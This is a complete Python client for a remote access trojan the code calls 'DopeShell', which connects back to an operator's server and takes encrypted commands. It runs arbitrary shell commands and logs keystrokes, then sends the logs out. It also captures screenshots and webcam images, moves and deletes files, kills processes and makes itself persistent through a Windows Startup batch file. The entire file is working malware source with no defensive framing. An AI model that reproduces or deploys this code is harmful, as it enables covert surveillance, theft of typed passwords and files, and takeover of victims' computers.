# dopeshell/client.py
import socket
import subprocess
import os
import getpass
import platform
import sys
import cv2
import io
import pynput.keyboard 
import threading
from PIL import ImageGrab
import shutil
import base64
import struct
import psutil
import argparse
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import subprocess
import time
class DopeShellclient:
    def __init__(self, server_ip, server_port, key):
        self.server_ip = server_ip
        self.server_port = server_port
        self.key = key
        self.keylog = []
        self.keylogger_thread = None
        self.is_keylogger_running = False
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def send_data(self, data):
        if (type(data) == str):
            # print('converting to bytes!')
            data = data.encode('utf-8')
        encrypted_data = self.encrypt(data)
        # Send the length of the data first
        self.sock.send(struct.pack('>I', len(encrypted_data)))
        # Send the actual data
        self.sock.sendall(encrypted_data)

    def encrypt(self, data):
        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(self.key), modes.CFB(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        encrypted_data = iv + encryptor.update(data) + encryptor.finalize()
        return base64.b64encode(encrypted_data)

    def decrypt(self, data):
        data = base64.b64decode(data)
        iv = data[:16]
        cipher = Cipher(algorithms.AES(self.key), modes.CFB(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_data = decryptor.update(data[16:]) + decryptor.finalize()
        return decrypted_data
    
    def install_persistence(self):
        try:
            # Path to the startup folder
            startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            batch_file_path = os.path.join(startup_folder, 'DopeShellClient.bat')

            # Get the path to the Python executable
            python_executable = sys.executable
            
            # Find the package entry point
            # Run `pip show DopeShell` and look for the `Location` field to find the installed package path
            package_name = 'DopeShell'  # Replace with your package name if different
            result = subprocess.run(['pip', 'show', package_name], capture_output=True, text=True)
            package_path = None
            output = 'unkown error'
            for line in result.stdout.splitlines():
                if line.startswith('Location:'):
                    package_path = line.split(' ', 1)[1].strip()
                    break

            if package_path is None:
                raise Exception("Failed to determine package path.")

            # Build the command to run the client
            key_argument = f' --key {self.key}' if self.key else ''
            entry_point_module = f'{package_name}.client'  # Adjust if the module name is different
            command = f'"{python_executable}" -m {entry_point_module} --server-ip {self.server_ip} --server-port {self.server_port}{key_argument}'

            # Create the batch file content
            batch_content = f'''
            @echo off
            REM Run DopeShell client with specified arguments
            {command}
            '''

            # Write the batch file
            with open(batch_file_path, 'w') as batch_file:
                batch_file.write(batch_content)

            output =  (f"[*] Persistence established via batch file in startup folder: {batch_file_path}")

        except Exception as e:
            output = (f"[-] Failed to establish persistence: {e}")
        return output
    
    def start_keylogger(self):
        self.is_keylogger_running = True
        self.keylogger_thread = threading.Thread(target=self.keylogger)
        self.keylogger_thread.start()
        return "[+] Keylogger started."

    # Method to stop keylogger and return logs
    def stop_keylogger(self):
        print('running stop keylogger function')
        self.is_keylogger_running = False
        if self.keylogger_thread:
            print('trying to stop thread')
            self.keylogger_thread.join(timeout=5)
        print('closed thread')
        # Send keylogs back to server
        print('sending keylogs to server')
        finalOutput = ' '.join(self.keylog) 

        self.send_data(finalOutput)
        print('sent keylogs to server')

        # Clear keylogs
        self.keylog = []
        return "[+] Keylogger stopped and keylogs sent."

    # Keylogger function
    def keylogger(self):
        def on_press(key):
            if self.is_keylogger_running:
                try:
                    self.keylog.append(key.char)
                except AttributeError:
                    self.keylog.append(f"[{key}]")

        with pynput.keyboard.Listener(on_press=on_press) as listener:
            listener.join()

    def execute_command(self, command):
        invalid = False
        output = b'no error returned'
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        timeout = 5  # seconds
        start_time = time.time()

        while process.poll() is None:
            time.sleep(1)  # Wait for 1 second
            if time.time() - start_time > timeout:
                process.kill()
                invalid = True
                break

        if invalid == False:
            try:
                output, error = process.communicate(timeout=10)
                if error:
                    return error
            except:
                output = "Unkown error!"

        return output

    def run(self):
        while True:
            try:
                self.sock.connect((self.server_ip, self.server_port))
                break
            except:
                time.sleep(10)
                print("could not connect")


        
        while True:
            command = self.decrypt(self.sock.recv(4096)).decode('utf-8')
            print(command)
            print(type(command))
            if command.lower() == 'exit':
                self.send_data('exiting')
                break



            elif command.lower() == 'screenshot':
                print('screenshot function called')
                screenshot = ImageGrab.grab()
                buffer = io.BytesIO()
                screenshot.save(buffer, format='PNG')
                buffer.seek(0)
                self.send_data(buffer.getvalue())

            elif command.lower().startswith('ls'):
                directory = command.split()[1] if len(command.split()) > 1 else '.'
                try:
                    items = os.listdir(directory)
                    files = []
                    for item in items:
                        if os.path.isdir(os.path.join(directory, item)):
                            files.append(f"{item}/")  # Append '/' for directories
                        else:
                            files.append(item)
                    files_output = "\n".join(files)
                except FileNotFoundError:
                    files_output = f"[-] Directory '{directory}' not found."
                except PermissionError:
                    files_output = f"[-] Permission denied for '{directory}'."
                self.send_data(files_output)


            elif command.lower() == 'pwd':
                cwd = os.getcwd()
                self.send_data(cwd)

            elif command.lower().startswith('cd'):
                directory = command.split()[1] if len(command.split()) > 1 else '.'
                try:
                    os.chdir(directory)
                    message = "[+] Changed directory."
                except FileNotFoundError:
                    message = f"[-] Directory '{directory}' not found"
                self.send_data(message)

            elif command == "keylogger_start":
                print("calling keylogger_start function")
                response = self.start_keylogger()
                self.send_data(response)

            elif command == "keylogger_stop":
                response = self.stop_keylogger()
                print('ran keylogger stop function')
                # self.send_data(response)

            elif command.lower().startswith('download'):
                _, file_path = command.split()
                try:
                    with open(file_path, 'rb') as f:
                        while chunk := f.read(4096):
                            # self.sock.send(self.encrypt(chunk))
                            self.send_data(chunk)
                    # self.sock.send(self.encrypt(b'EOF'))
                    self.send_data(b'EOF')
                except FileNotFoundError:
                    # self.sock.send(self.encrypt(b"[-] File not found."))
                    self.send_data("[-] File not found.")

            elif command.lower().startswith('upload'):
                _, file_name = command.split()
                with open(file_name, 'wb') as f:
                    while True:
                        file_data = self.decrypt(self.sock.recv(4096))
                        if file_data == b'EOF':
                            break
                        f.write(file_data)
                self.sock.send(self.encrypt(b"[+] File upload complete."))

            elif command.lower().startswith('capture_webcam'):
                cap = cv2.VideoCapture(0)
                ret, frame = cap.read()
                cap.release()
                if ret:
                    # Convert the image to bytes without saving it to a file
                    ret, buffer = cv2.imencode('.jpg', frame)
                    if ret:
                        image_bytes = buffer.tobytes()
                        print(type(image_bytes))
                        # print(image_bytes[:100])  # Print the first 100 bytes for verification
                        self.send_data(image_bytes)
                    else:
                        return "[-] Error encoding the image."
                else:
                    return "[-] Error capturing webcam image."

            elif command.lower().startswith('mkdir'):
                _, directory = command.split(' ', 1)
                try:
                    os.makedirs(directory)
                    output = f"Directory '{directory}' created successfully."
                except Exception as e:
                    output = f"Failed to create directory '{directory}': {e}"
                self.send_data(output)

            elif command.lower() == 'persist':
                output = self.install_persistence()
                self.send_data(output)

            elif command.lower().startswith('delete'):
                _, file_path = command.split(' ', 1)
                try:
                    os.remove(file_path)
                    output = f"File '{file_path}' deleted successfully."
                except Exception as e:
                    output = f"Failed to delete file '{file_path}': {e}"
                self.sock.send(self.encrypt(output.encode('utf-8')))

            elif command.lower() == 'ps':
                processes = ""
                for proc in psutil.process_iter(['pid', 'name', 'username']):
                    processes += f"PID: {proc.info['pid']}, Name: {proc.info['name']}, User: {proc.info['username']}\n"
                self.send_data(processes)

            elif command.lower().startswith('kill'):
                _, pid = command.split(' ', 1)
                try:
                    os.kill(int(pid), 9)
                    output = f"Process {pid} killed successfully."
                except Exception as e:
                    output = f"Failed to kill process {pid}: {e}"
                self.send_data(output)

            elif command.lower().startswith('cat'):
                try:
                    _, file_path = command.split(maxsplit=1)
                    if os.path.exists(file_path) and os.path.isfile(file_path):
                        with open(file_path, 'rb') as file:
                            file_content = file.read()
                        self.send_data(file_content)
                    else:
                        error_message = f"File {file_path} does not exist or is not a file."
                        self.send_data(error_message)
                except Exception as e:
                    error_message = f"Error reading file: {str(e)}"
                    self.send_data(error_message)

            elif command.lower() == 'netstat':
                netstat_output = subprocess.check_output('netstat -an', shell=True)
                self.send_data(netstat_output)

            elif command.lower() == 'clear':
                # Clear screen command for the client shell (may not be fully visible in reverse shell setup)
                output = "\033c"
                # self.sock.send(self.encrypt(output.encode('utf-8')))
                self.send_data(output)

            elif command.lower() in ['ifconfig', 'ipconfig']:
                if platform.system() == 'Windows':
                    ifconfig_output = subprocess.check_output('ipconfig', shell=True)
                else:
                    ifconfig_output = subprocess.check_output('ifconfig', shell=True)
                self.send_data(ifconfig_output)

            elif command.lower().startswith('find'):
                _, filename = command.split(' ', 1)
                matches = ""
                for root, dirs, files in os.walk('/'):
                    if filename in files:
                        matches += os.path.join(root, filename) + "\n"
                if matches:
                    self.send_data(matches)
                else:
                    output = f"No matches found for '{filename}'."
                    self.send_data(output)

            elif command.lower() == 'sysinfo':
                try:
                    hostname = socket.gethostname()
                    local_ip = socket.gethostbyname(hostname)
                except:
                    local_ip = "Unable to fetch IP"

                client_info = (
                    f"OS: {platform.system()} {platform.release()}\n"
                    f"Architecture: {platform.machine()}\n"
                    f"Hostname: {platform.node()}\n"
                    f"Processor: {platform.processor()}\n"
                    f"Current User: {getpass.getuser()}\n"
                    f"Local IP Address: {local_ip}\n"
                    f"RAM: {round(psutil.virtual_memory().total / (1024**3), 2)} GB\n"
                    f"Disk: {round(psutil.disk_usage('/').total / (1024**3), 2)} GB\n"
                )
                self.send_data(client_info)

            else:
                output = self.execute_command(command)
                self.send_data(output)
                # self.sock.send(self.encrypt(output))

        self.sock.close()

# hello
def main():
    parser = argparse.ArgumentParser(description="DopeShell Reverse Shell Client")
    parser.add_argument("--server-ip", type=str, required=True, help="IP address of the server to connect to")
    parser.add_argument("--server-port", type=int, default=4444, help="Port of the server to connect to (default: 4444)")
    parser.add_argument("--key", type=str, default="myverystrongpasswordo32bitlength", help="Encryption key (32 bytes)")

    args = parser.parse_args()

    key = args.key.encode("utf-8")
    client = DopeShellclient(args.server_ip, args.server_port, key)
    client.run()

#main function
if __name__ == "__main__":
    main()